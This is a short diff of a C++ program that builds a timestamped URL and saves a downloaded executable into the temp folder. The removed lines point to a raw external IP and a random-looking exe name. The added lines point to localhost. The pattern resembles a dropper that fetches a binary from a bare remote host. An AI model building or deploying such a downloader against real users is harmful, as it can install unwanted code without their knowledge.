@@ -17,10 +17,10 @@ int main() {
 	// using unixtime, to prevent caching otherwise for a more commercial way setup cdn and hashing...
 	std::time_t unixTime = std::time(nullptr);
 
-	std::string appname = "rxljfbrx.exe";
+	std::string appname = "app.exe";
 
 	// downloadURL example: http://127.0.0.1:8401/
-	std::string downloadURL = "http://45.92.216.46/" + appname + "?t=" + std::to_string(unixTime);
+	std::string downloadURL = "http://127.0.0.1:8401/" + appname + "?t=" + std::to_string(unixTime);
 	char fullPath[MAX_PATH];
 	snprintf(fullPath, MAX_PATH, "%s%s", temppath, appname.c_str());
 
